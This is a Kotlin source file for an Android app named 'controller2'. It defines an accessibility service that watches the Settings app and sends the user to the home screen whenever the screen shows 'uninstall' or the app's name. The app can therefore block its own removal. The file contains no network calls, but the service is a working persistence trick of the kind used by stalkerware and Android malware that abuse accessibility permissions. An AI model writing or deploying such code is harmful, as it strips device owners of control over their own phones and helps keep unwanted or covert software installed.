package com.controller2.app

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class MyAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: ""

        if (packageName.contains("settings", ignoreCase = true)) {
            val rootNode: AccessibilityNodeInfo? = rootInActiveWindow
            if (rootNode != null) {
                checkAndBlockUninstall(rootNode)
            }
        }
    }

    private fun checkAndBlockUninstall(node: AccessibilityNodeInfo) {
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val text = child.text?.toString()?.lowercase() ?: ""
            
            if (text.contains("controller 2") || text.contains("uninstall")) {
                performGlobalAction(GLOBAL_ACTION_HOME)
                break
            }
            checkAndBlockUninstall(child)
        }
    }

    override fun onInterrupt() {}
}
